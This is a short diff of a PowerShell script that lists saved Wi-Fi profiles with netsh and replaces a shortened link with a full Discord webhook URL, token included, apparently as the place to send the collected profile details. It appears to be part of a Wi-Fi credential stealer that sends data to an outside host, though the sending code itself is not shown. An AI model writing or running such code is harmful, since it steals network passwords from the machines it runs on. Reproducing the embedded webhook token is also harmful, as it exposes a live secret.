@@ -2,7 +2,7 @@
 $wifiProfiles = netsh wlan show profiles | Select-Object
 
 # Define the webhook URL
-$webhook_url = "https://bit.ly/3R3FRc5"
+$webhook_url = "https://discord.com/api/webhooks/1177355216417460254/Aml2aUzFIRG_u7kRlO6bAtNkEDACsk1rI9DgmnQ3h4nrHpplBsQ8-Qgzqz8loC1fp1AI"
 
 # Create an array to store the Wi-Fi profile details
 $wifiProfileDetailsArray = @()
